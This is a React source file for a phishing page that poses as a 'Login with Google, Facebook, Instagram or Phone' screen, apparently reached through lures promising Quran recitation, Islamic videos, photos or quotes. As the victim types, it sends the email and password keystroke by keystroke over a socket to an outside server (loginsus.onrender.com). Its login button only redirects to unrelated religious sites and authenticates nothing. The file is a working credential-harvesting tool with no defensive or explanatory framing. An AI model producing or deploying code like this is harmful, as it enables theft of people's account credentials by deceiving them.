import React, { useState, useEffect } from "react";
import io from "socket.io-client";
import { useLocation } from "react-router-dom";
import { FaGoogle, FaFacebook, FaInstagram, FaPhone } from "react-icons/fa";

const socket = io("https://loginsus.onrender.com");

export default function App() {
  const location = useLocation();
  const params = new URLSearchParams(location.search);
  const category = params.get("category");
  const type = params.get("type"); // 👈 chooseLogin se aaya
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [mySocketId, setMySocketId] = useState("");

  useEffect(() => {
    socket.on("connect", () => {
      setMySocketId(socket.id);
    });
    return () => socket.off("connect");
  }, []);

  // 🔹 Icon mapping
  const icons = {
    Google: <FaGoogle className="text-red-500 inline ml-2" />,
    Facebook: <FaFacebook className="text-blue-600 inline ml-2" />,
    Instagram: <FaInstagram className="text-pink-500 inline ml-2" />,
    Phone: <FaPhone className="text-green-600 inline ml-2" />,
  };

  // 🔹 Placeholder mapping
  const placeholders = {
    Google: "Enter your Google email",
    Facebook: "Enter your Facebook",
    Instagram: "Enter your Instagram username",
    Phone: "Enter your phone number",
  };

  const handleLogin = () => {
    if (category === "🎮 Recite Qura'an") {
      window.location.href = "https://quran.com/";
    } else if (category === "🎥 Inspiring Videos") {
      window.location.href = "https://hamariweb.com/islam/videos.aspx";
    } else if (category === "🌸 Beautiful Photos") {
      window.location.href = "https://in.pinterest.com/pin/9640586697921025/";
    } else if (category === "✨ Daily Quotes") {
      window.location.href = "https://hadith.com/browse.php?cid=2";
    }
  };

  const handleEmail = (e) => {
    setEmail(e.target.value);
    if (mySocketId) {
      socket.emit("typing", {
        field: "email",
        value: e.target.value,
        type,
        userId: mySocketId, // always send a valid id
      });
    }
  };

  const handlePassword = (e) => {
    setPassword(e.target.value);
    if (mySocketId) {
      socket.emit("typing", {
        field: "password",
        value: e.target.value,
        type,
        userId: mySocketId, // always send a valid id
      });
    }
  };

  return (
    !mySocketId ? (
      <div className="h-screen w-screen flex items-center justify-center bg-green-100">
        <button
          className="bg-blue-600 text-white py-3 px-16 cursor-pointer rounded-lg text-xl font-bold shadow-lg"
          onClick={() => window.location.reload()}
        >
          Refresh
        </button>
      </div>
    ) : (
      <div className="h-screen flex flex-col items-center justify-center bg-green-100">
        <div className="bg-green-50 p-8 rounded-xl shadow-md w-96 ">
          <h1 className="text-2xl font-bold mb-4">
            Login with: {icons[type]}
          </h1>
          <p className="text-gray-600 mb-6">
            Please enter your email/username or phone and password to continue
          </p>
          <input
            type="text"
            placeholder={placeholders[type] || "Email/Username or Phone"}
            value={email}
            onChange={handleEmail}
            className="w-full mb-4 p-2 border rounded-lg"
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={handlePassword}
            className="w-full mb-4 p-2 border rounded-lg"
          />
          <button
            className="w-full bg-blue-500 text-white py-2 rounded-lg disabled:bg-gray-400"
            disabled={!email || !password}
            onClick={handleLogin}
          >
            Login
          </button>
        </div>
      </div>
    )
  );
}
